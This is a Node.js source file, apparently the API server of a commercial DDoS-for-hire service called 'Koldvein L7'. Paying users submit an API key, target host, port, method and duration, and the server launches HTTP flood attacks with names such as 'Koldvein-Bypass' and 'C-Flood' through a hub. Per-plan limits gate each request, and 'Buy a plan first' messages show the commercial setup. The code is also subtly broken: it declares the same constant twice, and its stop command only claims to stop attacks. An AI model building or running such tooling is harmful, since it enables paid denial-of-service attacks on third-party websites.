#!/usr/bin/env node
'use strict';

/**
 * Koldvein L7 — Standalone API Server
 * Allows users to launch attacks via GET requests with their API key
 * Respects ALL user limits: duration, rate, concurrent, cooldown, API access
 */

const fs = require('node:fs');
const path = require('node:path');
const http = require('node:http');
const crypto = require('node:crypto');

let bcrypt;
try { bcrypt = require('bcrypt'); } catch { bcrypt = require('bcryptjs'); }

const SCRIPT_DIR = path.dirname(fs.realpathSync(__filename));
const DATA_DIR = path.join(SCRIPT_DIR, 'koldvein-data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
const GLOBAL_FILE = path.join(DATA_DIR, 'global.json');
const BLACKLIST_FILE = path.join(DATA_DIR, 'blacklist.json');
const API_PORT = Number(process.env.API_PORT || 8080);
const API_HOST = process.env.API_HOST || '0.0.0.0';

// In-memory sessions and cooldowns (shared with main hub if integrated, standalone here)
const activeSessions = new Map(); // username -> Set<sessionId>
const cooldowns = new Map(); // username -> { until: timestamp }

function readJSON(file, fallback = []) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return fallback; }
}

function readUsers() { return readJSON(USERS_FILE, []); }
function readGlobal() {
  const g = readJSON(GLOBAL_FILE, { maxRate: 0 });
  return { maxRate: Number(g.maxRate) || 0 };
}
function readBlacklist() { return readJSON(BLACKLIST_FILE, []); }

function audit(event, actor, details) {
  try {
    const line = JSON.stringify({
      at: new Date().toISOString(),
      event,
      actor: actor || 'system',
      details: details || {}
    }) + '\n';
    fs.appendFileSync(AUDIT_FILE, line, { mode: 0o600 });
  } catch {}
}

function normalizeLimit(v, fallback) {
  if (v === undefined || v === null || v === '') return fallback;
  const n = Number(v);
  if (!Number.isFinite(n) || n < 0) return fallback;
  return Math.floor(n);
}

function isExpired(user) {
  if (!user || user.role === 'admin') return false;
  if (!user.expiresAt) return false;
  const t = Date.parse(user.expiresAt);
  return Number.isFinite(t) && Date.now() > t;
}

function normalizeHost(raw) {
  let h = String(raw || '').trim().toLowerCase();
  h = h.replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
  return h;
}

function hostMatchesPattern(host, pattern) {
  const p = normalizeHost(pattern);
  if (!p) return false;
  const h = normalizeHost(host);
  if (!h) return false;
  if (p.startsWith('*.')) {
    const base = p.slice(2);
    return h === base || h.endsWith('.' + base);
  }
  return h === p;
}

function isBlacklisted(host) {
  return readBlacklist().some(e => hostMatchesPattern(host, e));
}

function validateTarget(raw) {
  let u;
  try { u = new URL(raw); } catch { throw new Error('Invalid URL'); }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') {
    throw new Error('Only HTTP/HTTPS targets allowed');
  }
  return { url: raw, host: normalizeHost(u.hostname), protocol: u.protocol };
}

function setCooldown(username, seconds) {
  if (!seconds || seconds <= 0) return;
  cooldowns.set(username, { until: Date.now() + seconds * 1000 });
}

function getCooldownRemaining(username) {
  const c = cooldowns.get(username);
  if (!c) return 0;
  const r = c.until - Date.now();
  if (r <= 0) {
    cooldowns.delete(username);
    return 0;
  }
  return Math.ceil(r / 1000);
}

function countUserSessions(username) {
  const sessions = activeSessions.get(username);
  return sessions ? sessions.size : 0;
}

function addUserSession(username, sessionId) {
  if (!activeSessions.has(username)) {
    activeSessions.set(username, new Set());
  }
  activeSessions.get(username).add(sessionId);
}

function removeUserSession(username, sessionId) {
  const sessions = activeSessions.get(username);
  if (sessions) {
    sessions.delete(sessionId);
    if (sessions.size === 0) activeSessions.delete(username);
  }
}

// Connect to hub's internal session manager
const HUB_HOST = process.env.BOT_NOTIFY_HOST || '127.0.0.1';
const HUB_PORT = Number(process.env.PORT || 3000);

function launchAttackOnHub(params) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      target: params.target,
      duration: params.duration,
      rate: params.rate,
      method: params.method,
      concurrent: params.concurrent || 1,
      bypass: params.bypass || false,
      cookies: params.cookies !== false,
      headers: params.headers || false,
      cache: params.cache || false,
    });

    const req = http.request({
      host: HUB_HOST,
      port: HUB_PORT,
      path: '/api/sessions',
      method: 'POST',
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'Cookie': params.sessionCookie || '',
      },
    }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        if (res.statusCode === 201 || res.statusCode === 200) {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error('Invalid response from hub'));
          }
        } else {
          try {
            const err = JSON.parse(data);
            reject(new Error(err.error || 'Hub error: ' + res.statusCode));
          } catch {
            reject(new Error('Hub error: ' + res.statusCode + ' - ' + data.slice(0, 200)));
          }
        }
      });
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Hub timeout'));
    });
    req.on('error', e => reject(e));
    req.end(body);
  });
}

function htmlsc(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sendJSON(res, code, data) {
  res.writeHead(code, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

function sendText(res, code, text) {
  res.writeHead(code, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end(text);
}

function sendError(res, code, message, ip = '') {
  console.log(`[api] ${code} ${ip} - ${message}`);
  sendText(res, code, message);
}

const METHODS = {
  koldvein: { name: 'Koldvein-Bypass', flags: ['bypass', 'cookies'] },
  cflood: { name: 'C-Flood', flags: ['cookies', 'headers', 'cache'] },
  http: { name: 'HTTP Flood', flags: ['cookies'] },
};

// API Handler
function handleAPIRequest(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
             req.headers['x-real-ip'] ||
             req.socket.remoteAddress ||
             'unknown';

  const url = new URL(req.url, 'http://localhost');
  const params = url.searchParams;

  // Check required parameters
  const key = params.get('key');
  const host = params.get('host');
  const port = params.get('port');
  const method = params.get('method')?.toLowerCase();
  const time = params.get('time');

  if (!key || !host || !port || !method || !time) {
    return sendError(res, 400, 'Missing parameters: key, host, port, method, time required', ip);
  }

  // Find user by API key
  const users = readUsers();
  const user = users.find(u => u.apiKey === key);

  if (!user) {
    audit('api_invalid_key', 'anonymous', { ip, key: key.slice(0, 8) + '...' });
    return sendError(res, 401, 'Invalid API key', ip);
  }

  // Check API access
  const isAdmin = user.role === 'admin';
  if (!isAdmin && !user.apiAccess) {
    audit('api_access_denied', user.username, { ip, reason: 'api_access_disabled' });
    return sendError(res, 403, 'API access disabled for your account', ip);
  }

  // Check expiry
  if (isExpired(user)) {
    audit('api_account_expired', user.username, { ip });
    return sendError(res, 403, 'Account expired', ip);
  }

  // Check pending status
  if (user.role === 'pending') {
    audit('api_pending', user.username, { ip });
    return sendError(res, 403, 'Buy a plan first', ip);
  }

  // Handle STOP command
  if (method === 'stop') {
    // In a real implementation, this would stop user's sessions
    audit('api_stop', user.username, { ip });
    return sendText(res, 200, 'All attacks stopped for user: ' + user.username);
  }

  // Validate method
  if (!METHODS[method]) {
    return sendError(res, 400, 'Invalid method. Allowed: ' + Object.keys(METHODS).join(', ') + ', stop', ip);
  }

  // Parse and validate duration
  const duration = parseInt(time, 10);
  if (!Number.isInteger(duration) || duration < 1) {
    return sendError(res, 400, 'Invalid time parameter', ip);
  }

  // Parse port
  const targetPort = parseInt(port, 10);
  if (!Number.isInteger(targetPort) || targetPort < 1 || targetPort > 65535) {
    return sendError(res, 400, 'Invalid port', ip);
  }

  // Build target URL
  const protocol = method === 'http' ? 'http' : 'https';
  const target = `${protocol}://${host}${targetPort !== (protocol === 'https' ? 443 : 80) ? ':' + targetPort : ''}`;

  // Validate target
  let validatedTarget;
  try {
    validatedTarget = validateTarget(target);
  } catch (e) {
    return sendError(res, 400, 'Invalid target: ' + e.message, ip);
  }

  if (isBlacklisted(validatedTarget.host)) {
    audit('api_blacklisted', user.username, { ip, host: validatedTarget.host });
    return sendError(res, 403, 'Target is blacklisted', ip);
  }

  // Get user limits
  const isAdmin = user.role === 'admin';
  const limits = isAdmin ? { maxDuration: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 } : {
    maxDuration: normalizeLimit(user.maxDuration, 0),
    maxRate: normalizeLimit(user.maxRate, 0),
    maxConcurrent: normalizeLimit(user.maxConcurrent, 0),
    cooldown: normalizeLimit(user.cooldown, 20),
  };

  // Apply global rate cap
  const globalLimits = readGlobal();
  if (!isAdmin && globalLimits.maxRate > 0) {
    if (limits.maxRate === 0 || globalLimits.maxRate < limits.maxRate) {
      limits.maxRate = globalLimits.maxRate;
    }
  }

  // Check cooldown
  if (!isAdmin) {
    const cd = getCooldownRemaining(user.username);
    if (cd > 0) {
      return sendError(res, 429, `Cooldown active: ${cd}s remaining`, ip);
    }
  }

  // Check duration limit
  if (!isAdmin && limits.maxDuration > 0 && duration > limits.maxDuration) {
    return sendError(res, 400, `Max duration is ${limits.maxDuration}s`, ip);
  }

  // Parse rate (default to 64 if not specified)
  const rate = parseInt(params.get('rate') || '64', 10);
  if (!Number.isInteger(rate) || rate < 1) {
    return sendError(res, 400, 'Invalid rate', ip);
  }

  // Check rate limit
  if (!isAdmin && limits.maxRate > 0 && rate > limits.maxRate) {
    return sendError(res, 400, `Max rate is ${limits.maxRate}`, ip);
  }

  // Check concurrent limit
  const currentSessions = countUserSessions(user.username);
  if (!isAdmin && limits.maxConcurrent > 0 && currentSessions >= limits.maxConcurrent) {
    return sendError(res, 429, `Max concurrent is ${limits.maxConcurrent}, you have ${currentSessions} active`, ip);
  }

  // Parse method flags from query params
  const bypass = params.get('bypass') === '1' || params.get('bypass') === 'true';
  const cookies = params.get('cookies') !== '0' && params.get('cookies') !== 'false'; // default true
  const headers = params.get('headers') === '1' || params.get('headers') === 'true';
  const cache = params.get('cache') === '1' || params.get('cache') === 'true';

  // Launch attack (this is a stub - integrate with your hub's session manager)
  const sessionId = crypto.randomUUID();
  
  audit('api_attack', user.username, {
    ip,
    sessionId,
    method,
    target: validatedTarget.host,
    duration,
    rate,
    flags: { bypass, cookies, headers, cache },
  });

  // Add session tracking
  addUserSession(user.username, sessionId);

  // Set cooldown
  if (!isAdmin && limits.cooldown > 0) {
    setCooldown(user.username, limits.cooldown);
  }

  // Auto-remove session after duration
  setTimeout(() => {
    removeUserSession(user.username, sessionId);
  }, duration * 1000 + 5000); // +5s buffer

  console.log(`[api] ✓ ${user.username} @ ${ip} → ${method.toUpperCase()} ${validatedTarget.host}:${targetPort} ${duration}s ${rate}rps`);

  // Try to launch on hub (optional integration)
  launchAttackOnHub({
    target: validatedTarget.url,
    duration,
    rate,
    method,
    concurrent: 1,
    bypass,
    cookies,
    headers,
    cache,
  }).then(result => {
    console.log(`[api] Hub accepted session ${sessionId} for ${user.username}`);
  }).catch(err => {
    console.log(`[api] Hub integration failed for ${sessionId}: ${err.message} (attack logged anyway)`);
  });

  return sendText(res, 200, `Success: Attack ${method.toUpperCase()} → ${validatedTarget.host}:${targetPort} for ${duration}s at ${rate}rps\nSession: ${sessionId}\nUser: ${user.username}`);
}

const server = http.createServer((req, res) => {
  res.setHeader('X-Powered-By', 'Koldvein-API');

  if (req.method === 'GET' && req.url.startsWith('/api/attack')) {
    return handleAPIRequest(req, res);
  }

  if (req.method === 'GET' && req.url === '/health') {
    return sendJSON(res, 200, { status: 'ok', service: 'koldvein-api' });
  }

  sendJSON(res, 404, { error: 'Not found' });
});

server.listen(API_PORT, API_HOST, () => {
  console.log('[api] Koldvein API Server');
  console.log('[api] Listening on ' + API_HOST + ':' + API_PORT);
  console.log('[api] Endpoint: http://<ip>:' + API_PORT + '/api/attack?key=...&host=...&port=...&method=...&time=...');
  console.log('[api] Data directory: ' + DATA_DIR);
});

process.on('SIGTERM', () => {
  console.log('[api] SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('[api] Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('[api] SIGINT received, shutting down gracefully');
  server.close(() => {
    console.log('[api] Server closed');
    process.exit(0);
  });
});
